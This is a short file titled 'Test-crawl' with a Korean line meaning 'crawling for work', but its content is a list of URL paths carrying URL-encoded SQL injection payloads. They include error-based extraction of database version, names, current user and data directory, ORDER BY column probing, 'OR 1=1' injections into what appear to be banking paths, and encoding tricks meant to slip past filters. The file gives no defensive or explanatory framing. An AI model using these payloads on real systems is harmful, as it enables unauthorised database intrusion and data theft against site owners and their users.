# Test-crawl
업무용 크롤링


/?Origin=%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+banner+FROM+v%24version+WHERE+rownum%3D1%29%29--
/?s=1%27+AND+CASE+WHEN+1%3D1+THEN+1+ELSE+CAST%28%28SELECT+version%28%29%29+AS+INT%29+END%3D1--+&_=836562&공통
/?s=%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+banner+FROM+v%24version+WHERE+rownum%3D1%29%29--
/?collection_id=%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+banner+FROM+v%24version+WHERE+rownum%3D1%29%29--
/?term=1%27+AND+CAST%28%28SELECT+version%28%29%29+AS+bigint%29%2B9223372036854775807--+&_=636352&공통
/?s=1%27+AND+CAST%28%28SELECT+version%28%29%29+AS+bigint%29%2B9223372036854775807--+&_=477990&공통
/?term=%27+AND+extr%2F%2A%2A%2Factvalue%281%2Cconcat%280x7e%2Cversion%28%29%2C0x7e%29%29--+&_=236899&공통
/?collection_id=1%27+AND+CASE+WHEN+1%3D1+THEN+1+ELSE+CAST%28%28SELECT+version%28%29%29+AS+INT%29+END%3D1--+&_=994414&공통
/?collection_id=%252527%2520AND%2520EXTRACTVALUE%281%252CCONCAT%280x7e%252C%28SELECT%2520VERSION%28%29%29%252C0x7e%29%29--%2520&_=541267&공통
/?collection_id=11%27+%2F%2A%2150000AND%2A%2F+EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%29--+&_=699826&공통
/?collection_id=1%001%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%29--%20&_=655860&공통
/?collection_id=%ef%bb%bf1%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%29--%20&_=581375&공통
/?collection_id=1%c0%80%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%29--%20&_=380085&공통
/?collection_id=1%e2%80%a8%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%29--%20&_=666313&공통
/?collection_id=%25%32%37%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%29--%20&_=910190&공통
/?collection_id=1%bf%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%29--%20&_=579055&공통
/?collection_id=1%27+ORDER+BY+1--+&_=943776&공통
/?collection_id=1%27+ORDER+BY+2--+&_=183061&공통
/?collection_id=1%27+ORDER+BY+4--+&_=335385&공통
/?collection_id=1%27+ORDER+BY+8--+&_=837589&공통
/?collection_id=1%27+ORDER+BY+16--+&_=228290&공통
/?collection_id=1%27+ORDER+BY+32--+&_=499120&공통
/?collection_id=1%27+ORDER+BY+64--+&_=465239&공통
/?collection_id=%27+ORDER+BY+2--+&_=545187&공통
/?collection_id=1%27+ORDER+BY+1%23&_=515385&공통
/?collection_id=1%27+ORDER+BY+2%23&_=905639&공통
/?collection_id=%27+ORDER+BY+32%23&_=715299&공통
/?term=test%27+AND+1%3DCAST%28%28SELECT+string_agg%28datname%2C%27%2C%27%29+FROM+pg_database%29+AS+INT%29--+-+&_=422184&공통
/?term=test%27+AND+1%3DCAST%28%28SELECT+%40%40version%29+AS+INT%29--+-+&_=824968&공통
/?term=test%27+AND+1%3DCONVERT%28INT%2C%28SELECT+db_name%28%29%29%29--+-+&_=903998&공통
/?keyword=test%27+AND+1%3DCAST%28%28SELECT+string_agg%28datname%2C%27%2C%27%29+FROM+pg_database%29+AS+INT%29--+-+&_=143227&공통
/?keyword=test%27+AND+1%3DCAST%28%28SELECT+current_setting%28%27data_directory%27%29%29+AS+INT%29--+-+&_=713040&공통
/?keyword=test%27+AND+1%3DCAST%28%28SELECT+%40%40version%29+AS+INT%29--+-+&_=694741&공통
/?keyword=test%27+AND+1%3DCONVERT%28INT%2C%28SELECT+db_name%28%29%29%29--+-+&_=319279&공통


/?term=test%27+AND+1%3DUTL_INADDR.GET_HOST_ADDRESS%28%28SELECT+banner+FROM+v%24version+WHERE+rownum%3D1%29%29--+-+&_=334813&공통
/?term=test%27+AND+1%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28SELECT+banner+FROM+v%24version+WHERE+rownum%3D1%29%29--+-+&_=859108&공통
/?s=test%27+AND+1%3DCAST%28%28SELECT+string_agg%28datname%2C%27%2C%27%29+FROM+pg_database%29+AS+INT%29--+-+&_=909593&공통
/?s=test%27+AND+1%3DCONVERT%28INT%2C%28SELECT+db_name%28%29%29%29--+-+&_=431552&공통
/?keyword=test%27+AND+1%3DUTL_INADDR.GET_HOST_ADDRESS%28%28SELECT+banner+FROM+v%24version+WHERE+rownum%3D1%29%29--+-+&_=597200&공통
/?keyword=test%27+AND+1%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28SELECT+banner+FROM+v%24version+WHERE+rownum%3D1%29%29--+-+&_=140767&공통
/?s=test%27+AND+1%3DUTL_INADDR.GET_HOST_ADDRESS%28%28SELECT+banner+FROM+v%24version+WHERE+rownum%3D1%29%29--+-+&_=275409&공통
/?s=test%27+AND+1%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28SELECT+banner+FROM+v%24version+WHERE+rownum%3D1%29%29--+-+&_=939450&공통
/register1%20OR%201=1?_=974638
/banking/ib201%20OR%201=1/mnu/COMERR000002?ib20_redirect_org_mnu=WBKMBJ000001&_=820688
/?data%5Blimit%5D=x%27%29+OR+CAST%28%28SELECT+version%28%29%29+AS+int%29%3E0+OR+%28%27a%27%3D%27a&_=853143
/?data%5Bid%5D=x%27%29+OR+CAST%28%28SELECT+version%28%29%29+AS+int%29%3E0+OR+%28%27a%27%3D%27a&_=767934
/?data%5BUser%5D%5Bid%5D=x%27%29+OR+CAST%28%28SELECT+version%28%29%29+AS+int%29%3E0+OR+%28%27a%27%3D%27a&_=230814
/?term=test&term[]=1&term[]=1%27%20AND%20CASE%20WHEN%201%3D1%20THEN%201%20ELSE%20CAST%28%28SELECT%20version%28%29%29%20AS%20INT%29%20END%3D1--%20&공통
/?filter=1&filter[]=1&filter[]=1%27%20AND%20CAST%28%28SELECT%20version%28%29%29%20AS%20bigint%29+9223372036854775807--%20&공통
/?filter=1&filter[]=1&filter[]=1%27%20AND%20JSON_KEYS%28%28SELECT%20version%28%29%29%29--%20&공통
/?filter=1&filter[]=1&filter[]=1%27%20AND%20EXP%28~%28SELECT%2AFROM%28SELECT%20USER%28%29%29x%29%29--%20&공통
/?term=test&term[]=1&term[]=1%27%20AND%20JSON_KEYS%28%28SELECT%20version%28%29%29%29--%20&공통
/ib20/mnu/CMMCOM2300001%20OR%201=1?_=583808
/?term=test&term[]=1&term[]=1%27%20AND%20EXP%28~%28SELECT%2AFROM%28SELECT%20USER%28%29%29x%29%29--%20&공통
/user1%20OR%201=1?_=893885
/?Search%5Bquery%5D=1%27+AND+CASE+WHEN+1%3D1+THEN+1+ELSE+CAST%28%28SELECT+version%28%29%29+AS+INT%29+END%3D1--+&_=601853&공통
/?data%5BSearch%5D%5Bquery%5D=x%27%29+OR+CAST%28%28SELECT+version%28%29%29+AS+int%29%3E0+OR+%28%27a%27%3D%27a&_=658230
/?User%5Busername%5D=1%27+AND+CASE+WHEN+1%3D1+THEN+1+ELSE+CAST%28%28SELECT+version%28%29%29+AS+INT%29+END%3D1--+&_=529260&공통
/?User%5Busername%5D=1%27+AND+CASE+WHEN+1%3D1+THEN+1+ELSE+CAST%28%28SELECT+version%28%29%29+AS+INT%29+END%3D1--+&_=529260&공통
/?filter=1&filter[]=1&filter[]=1%20AND%20updatexml%281%2Cconcat%280x7e%2C%28SELECT%20version%28%29%29%29%2C1%29--%20-&공통
/?User%5Busername%5D=1%27+AND+CAST%28%28SELECT+version%28%29%29+AS+bigint%29%2B9223372036854775807--+&_=133826&공통
/?Search%5Bquery%5D=%27+AND+extr%2F%2A%2A%2Factvalue%281%2Cconcat%280x7e%2Cversion%28%29%2C0x7e%29%29--+&_=955831&공통
/?data%5BSearch%5D%5Bquery%5D=1%27+AND+CAST%28%28SELECT+version%28%29%29+AS+bigint%29%2B9223372036854775807--+&_=106300&공통
/?data%5BSearch%5D%5Bquery%5D=1%27+AND+CASE+WHEN+1%3D1+THEN+1+ELSE+CAST%28%28SELECT+version%28%29%29+AS+INT%29+END%3D1--+&_=155994&공통
/?User%5Busername%5D=%27+AND+extr%2F%2A%2A%2Factvalue%281%2Cconcat%280x7e%2Cversion%28%29%2C0x7e%29%29--+&_=978260&공통
/?data%5BSearch%5D%5Bquery%5D=%27+AND+extr%2F%2A%2A%2Factvalue%281%2Cconcat%280x7e%2Cversion%28%29%2C0x7e%29%29--+&_=722758&공통
/?term=test&term[]=1&term[]=1%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--%20-&공통
/?term=test&term[]=1&term[]=1%20AND%20updatexml%281%2Cconcat%280x7e%2C%28SELECT%20version%28%29%29%29%2C1%29--%20-&공통



/?filter=1&filter[]=1&filter[]=1%20AND%20exp%28~%28SELECT%2AFROM%28SELECT%20version%28%29%29x%29%29--%20-&공통
/?filter=1&filter[]=1&filter[]=1%20AND%20extractvalue%281%2Cconcat%280x7e%2C%28SELECT%20current_user%28%29%29%29%29--%20-&공통
/?filter=1&filter[]=1&filter[]=1%20AND%20json_keys%28concat%28%27%7B%22%27%2Cversion%28%29%2C%27%22%3A1%7D%27%29%29--%20-&공통
